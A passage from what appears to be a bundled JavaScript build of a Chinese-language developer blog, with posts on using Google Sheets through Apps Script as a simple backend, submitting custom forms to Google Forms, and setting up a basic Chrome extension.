https://docs.google.com/spreadsheets/d/[sheet-id]/</span>\n<span class=\"token keyword\">const</span> SpreadSheetID <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 下方的表單名稱</span>\n<span class=\"token keyword\">const</span> sheetName <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> params <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>parameter<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> SpreadSheet <span class=\"token operator\">=</span> SpreadsheetApp<span class=\"token punctuation\">.</span><span class=\"token function\">openById</span><span class=\"token punctuation\">(</span>SpreadSheetID<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> Sheet <span class=\"token operator\">=</span> SpreadSheet<span class=\"token punctuation\">.</span><span class=\"token function\">getSheetByName</span><span class=\"token punctuation\">(</span>sheetName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token comment\">// default wouldn't return category row (the first row)</span>\n  <span class=\"token keyword\">const</span> row <span class=\"token operator\">=</span> params<span class=\"token punctuation\">.</span>row <span class=\"token operator\">?</span> params<span class=\"token punctuation\">.</span>row <span class=\"token operator\">:</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> col <span class=\"token operator\">=</span> params<span class=\"token punctuation\">.</span>col <span class=\"token operator\">?</span> params<span class=\"token punctuation\">.</span>col <span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> rowRange <span class=\"token operator\">=</span>\n    params<span class=\"token punctuation\">.</span>endRow <span class=\"token operator\">&amp;&amp;</span> params<span class=\"token punctuation\">.</span>row\n      <span class=\"token operator\">?</span> params<span class=\"token punctuation\">.</span>endRow <span class=\"token operator\">-</span> params<span class=\"token punctuation\">.</span>row <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\n      <span class=\"token operator\">:</span> Sheet<span class=\"token punctuation\">.</span><span class=\"token function\">getLastRow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> colRange <span class=\"token operator\">=</span>\n    params<span class=\"token punctuation\">.</span>endCol <span class=\"token operator\">&amp;&amp;</span> params<span class=\"token punctuation\">.</span>col\n      <span class=\"token operator\">?</span> params<span class=\"token punctuation\">.</span>endCol <span class=\"token operator\">-</span> params<span class=\"token punctuation\">.</span>col <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\n      <span class=\"token operator\">:</span> Sheet<span class=\"token punctuation\">.</span><span class=\"token function\">getLastColumn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>rowRange <span class=\"token operator\">></span> Sheet<span class=\"token punctuation\">.</span><span class=\"token function\">getLastRow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> rowRange <span class=\"token operator\">=</span> Sheet<span class=\"token punctuation\">.</span><span class=\"token function\">getLastRow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>colRange <span class=\"token operator\">></span> Sheet<span class=\"token punctuation\">.</span><span class=\"token function\">getLastColumn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> colRange <span class=\"token operator\">=</span> Sheet<span class=\"token punctuation\">.</span><span class=\"token function\">getLastColumn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">const</span> data <span class=\"token operator\">=</span> Sheet<span class=\"token punctuation\">.</span><span class=\"token function\">getSheetValues</span><span class=\"token punctuation\">(</span>row<span class=\"token punctuation\">,</span> col<span class=\"token punctuation\">,</span> rowRange<span class=\"token punctuation\">,</span> colRange<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">return</span> ContentService<span class=\"token punctuation\">.</span><span class=\"token function\">createTextOutput</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setMimeType</span><span class=\"token punctuation\">(</span>\n    ContentService<span class=\"token punctuation\">.</span>MimeType<span class=\"token punctuation\">.</span><span class=\"token constant\">JSON</span>\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">doPost</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> params <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>parameter<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> SpreadSheet <span class=\"token operator\">=</span> SpreadsheetApp<span class=\"token punctuation\">.</span><span class=\"token function\">openById</span><span class=\"token punctuation\">(</span>SpreadSheetID<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> Sheet <span class=\"token operator\">=</span> SpreadSheet<span class=\"token punctuation\">.</span><span class=\"token function\">getSheetByName</span><span class=\"token punctuation\">(</span>sheetName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> NewRow <span class=\"token operator\">=</span> Sheet<span class=\"token punctuation\">.</span><span class=\"token function\">getLastRow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token comment\">// customize data key here</span>\n  <span class=\"token keyword\">const</span> dataKey <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"data\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token comment\">// add Timestamp in the first column</span>\n  Sheet<span class=\"token punctuation\">.</span><span class=\"token function\">getRange</span><span class=\"token punctuation\">(</span>NewRow<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Date</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">setNumberFormat</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yyyy/MM/dd hh:mm\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token comment\">// add data by keys to the last row</span>\n  dataKey<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">key<span class=\"token punctuation\">,</span> i</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    Sheet<span class=\"token punctuation\">.</span><span class=\"token function\">getRange</span><span class=\"token punctuation\">(</span>NewRow<span class=\"token punctuation\">,</span> i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span>params<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">return</span> ContentService<span class=\"token punctuation\">.</span><span class=\"token function\">createTextOutput</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"POST success\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><p>GAS 有三種回傳資料的方式</p>\n<ol>\n<li>回傳字串</li>\n</ol>\n<p><code>return ContentService.createTextOutput(&quot;GET 回傳字串&quot;);</code></p>\n<ol start=\"2\">\n<li>回傳 HTML</li>\n</ol>\n<p><code>return HtmlService.createHtmlOutput(HTMLString);</code></p>\n<ol start=\"3\">\n<li>回傳 JSON</li>\n</ol>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> JSONString <span class=\"token operator\">=</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">return</span> ContentService<span class=\"token punctuation\">.</span><span class=\"token function\">createTextOutput</span><span class=\"token punctuation\">(</span>JSONString<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setMimeType</span><span class=\"token punctuation\">(</span>\n  ContentService<span class=\"token punctuation\">.</span>MimeType<span class=\"token punctuation\">.</span><span class=\"token constant\">JSON</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"網頁取得\">網頁取得</h3>\n<h4 id=\"fetch\">Fetch</h4>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// 上面步驟取得的網址</span>\n<span class=\"token keyword\">const</span> appUrl <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span>appUrl<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  method<span class=\"token operator\">:</span> <span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">respons</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// GAS 回傳資料為 JSON 格式時</span>\n    <span class=\"token keyword\">return</span> respons<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">respons</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// response data here</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>respons<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">error</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>也可以搭配 <code>URLSearchParams</code> 傳入參數，做進一步的取得處理\n參數會傳至 GAS 中的 <code>e.parameter</code> 裡</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// 上面步驟取得的網址</span>\n<span class=\"token keyword\">const</span> appUrl <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URL</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> params <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  action<span class=\"token operator\">:</span> <span class=\"token string\">\"getAll\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\nappUrl<span class=\"token punctuation\">.</span>search <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URLSearchParams</span><span class=\"token punctuation\">(</span>params<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span>appUrl<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  method<span class=\"token operator\">:</span> <span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">respons</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// GAS 回傳資料為 JSON 格式時</span>\n    <span class=\"token keyword\">return</span> respons<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">respons</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// response data here</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>respons<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">error</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"jquery\">jQuery</h4>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> appUrl <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">;</span>\n\n$<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>appUrl <span class=\"token operator\">+</span> <span class=\"token string\">\"?action=getAll\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n$<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span>appUrl<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n    action<span class=\"token operator\">:</span> <span class=\"token string\">'create'</span><span class=\"token punctuation\">,</span>\n    data<span class=\"token operator\">:</span> <span class=\"token string\">'Hello World!'</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n$<span class=\"token punctuation\">.</span><span class=\"token function\">ajax</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    type<span class=\"token operator\">:</span> <span class=\"token string\">\"post\"</span><span class=\"token punctuation\">,</span>\n    url<span class=\"token operator\">:</span> appUrl<span class=\"token punctuation\">,</span>\n    data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      action<span class=\"token operator\">:</span> <span class=\"token string\">'create'</span><span class=\"token punctuation\">,</span>\n      data<span class=\"token operator\">:</span> <span class=\"token string\">'Hello World!'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function-variable function\">success</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><h3 id=\"網頁傳送\">網頁傳送</h3>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> appUrl <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> params <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  action<span class=\"token operator\">:</span> <span class=\"token string\">\"create\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token string\">\"Hello World!\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span>appUrl<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  method<span class=\"token operator\">:</span> <span class=\"token string\">\"POST\"</span><span class=\"token punctuation\">,</span>\n  body<span class=\"token operator\">:</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>params<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"參考文章\">參考文章</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/unalai/%E5%AF%AB%E7%B5%A6%E7%B4%94%E5%89%8D%E7%AB%AF-%E8%AE%93-google-sheets-%E7%95%B6%E4%BD%A0%E7%9A%84%E5%BE%8C%E7%AB%AF%E5%AE%8C%E6%88%90%E5%AF%AB%E5%85%A5%E5%8A%9F%E8%83%BD-715799e5e013\">寫給純前端，讓 Google Sheets 當你的後端完成寫入功能 | by Lai | UnaLai | Medium</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://tutorials.webduino.io/zh-tw/docs/socket/useful/google-sheet-2.html\">Google 試算表 ( 前後端實作 ) - Webduino 實戰智慧插座教學</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://g0v.hackpad.tw/5Ofw64qSz7P#:h=Google-Spreadsheet\">盤點各種線上協作資料(庫)方案 - g0v.hackpad.tw</a></li>\n</ul>\n","date":"2020-07-23T00:40:12.000Z","excerpt":"","printDate":"July 23, 2020","printReadingTime":"4 min read"};

var route_38 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod62
});

var Mod63 = {"title":"自訂 Google 表單的外觀","slug":"how-to-customize-google-form-style","html":"<h2 id=\"事前準備\">事前準備</h2>\n<ol>\n<li>先在 Google Form 製作好和需求相同形式的 Form</li>\n<li>點擊右上預覽表單</li>\n<li>開啟開發者工具</li>\n<li>尋找 <code>&lt;form&gt;</code> 標籤 <code>action</code> 屬性中的傳送表單網址\n<br>├ <code>action=[表單網址]</code>\n<br>└ <code>https://docs.google.com/forms/u/0/d/e/xxxxxxx/formResponse</code></li>\n<li>尋找所有提問的 id\n<br>├ <code>name=[提問 ID]</code>\n<br>└ 通常為 <code>entry.xxxxxxx</code>，可使用此關鍵字快速搜尋</li>\n<li>撰寫自訂表格網頁，並將傳送行為綁定至自訂的傳送按鍵上</li>\n</ol>\n<h2 id=\"傳送表單\">傳送表單</h2>\n<ol>\n<li>jQuery</li>\n</ol>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">request</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">var</span> url <span class=\"token operator\">=</span> <span class=\"token string\">\"https://docs.google.com/forms/u/0/d/e/xxxxxxx/formResponse\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">var</span> data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"entry.xxxxxxx\"</span><span class=\"token operator\">:</span> <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#data1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"entry.xxxxxxx\"</span><span class=\"token operator\">:</span> <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#data2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">val</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n  $<span class=\"token punctuation\">.</span><span class=\"token function\">ajax</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    type<span class=\"token operator\">:</span> <span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span>\n    url<span class=\"token operator\">:</span> url<span class=\"token punctuation\">,</span>\n    data<span class=\"token operator\">:</span> data<span class=\"token punctuation\">,</span>\n    <span class=\"token function-variable function\">complete</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"response sent!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><ol start=\"2\">\n<li>Vue\n<br>└ 搭配 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/pagekit/vue-resource/blob/develop/docs/http.md\">vue-resource</a> 使用</li>\n</ol>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// ...</span>\n  <span class=\"token function-variable function\">data</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{</span>\n      data1<span class=\"token operator\">:</span> <span class=\"token string\">\"value1\"</span><span class=\"token punctuation\">,</span>\n      data2<span class=\"token operator\">:</span> <span class=\"token string\">\"value2\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  methods<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">submitForm</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">const</span> url <span class=\"token operator\">=</span> <span class=\"token string\">\"https://docs.google.com/forms/u/0/d/e/xxxxxxx/formResponse\"</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">const</span> data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"entry.xxxxxxx\"</span><span class=\"token operator\">:</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>data1<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"entry.xxxxxxx\"</span><span class=\"token operator\">:</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>data2<span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>$http<span class=\"token punctuation\">.</span><span class=\"token function\">jsonp</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n        method<span class=\"token operator\">:</span> <span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span>\n        params<span class=\"token operator\">:</span> data<span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre><h2 id=\"參考文章\">參考文章</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/inoue2002/items/78dac54dba93ea4a087a\">独自フォームと Google フォームを連携してかっこよくスマートにアンケート回収する - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/Robot-Inventor/items/56e2b7b69760d045fad3\">【2020 年最新版】カスタマイズしたフォームから JavaScript で Google フォームに回答を送信 - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://valmore.work/auto-response-from-google-form/\">【GAS】自動返信機能付き Google フォームの作り方 – Valmore</a></li>\n</ul>\n","date":"2020-06-10T14:59:54.000Z","excerpt":"","printDate":"June 10, 2020","printReadingTime":"1 min read"};

var route_21 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod63
});

var Mod64 = {"title":"如何建立 Chrome 插件","slug":"make-chrome-extension","html":"<h2 id=\"chrome-套件架構\">Chrome 套件架構</h2>\n<ol>\n<li>manifest</li>\n<li>background script</li>\n<li>ui elements</li>\n<li>content script</li>\n<li>options page</li>\n</ol>\n<h2 id=\"詳細介紹\">詳細介紹</h2>\n<h3 id=\"mainfest\">mainfest</h3>\n<p>建立 Manifest 檔案</p>\n<ul>\n<li><code>manifest.json</code>：基本設定</li>\n<li><code>manifest_version</code>: manifest 檔案使用的格式版本（目前官方最新版為 2）</li>\n<li><code>version</code>: 此套件的版本資訊（初次完成的版本可設定為 1）</li>\n<li><code>name</code>: 套件名稱</li>\n<li><code>description</code>: 套件簡短介紹</li>\n<li><code>icons</code>: 提供套件將使用到的各尺寸圖像檔</li>\n</ul>\n<pre class=\"language-json\"><code class=\"language-json\">{\n  \"name\": \"Placeholder Image\",\n  \"version\": \"1.1\",\n  \"description\": \"Quickly find the right placeholder image for yourself!\",\n  \"manifest_version\": 2,\n  \"icons\": {\n    \"16\": \"images/image16.png\",\n    \"32\": \"images/image32.png\",\n    \"48\": \"images/image48.png\",\n    \"128\": \"images/image128.png\"\n  }\n}</code></pre><h3 id=\"background-script\">background script</h3>\n<p>設定 Background Scripts</p>\n<ul>\n<li><code>manifest.json</code>：設定 <code>background</code> 屬性和其相關設定</li>\n<li><code>scripts</code>: 設定使用哪個背景腳本檔案（在此用 <code>background.js</code>）</li>\n<li><code>persistent</code>: 設定背景腳本是否持續運行（官方建議 <code>false</code>: 根據事件開啟和關閉）</li>\n</ul>\n<pre class=\"language-json\"><code class=\"language-json\">{\n  ...\n  \"background\": {\n    \"scripts\": [\n      \"background.js\"\n    ],\n    \"persistent\": false\n  },\n  ...\n}</code></pre><h2 id=\"download-file-chrome-extension\">Download File Chrome Extension</h2>\n<pre class=\"language-jsx\"><code class=\"language-jsx\"><span class=\"token keyword\">let</span> images <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">slice</span>\n  <span class=\"token punctuation\">.</span><span 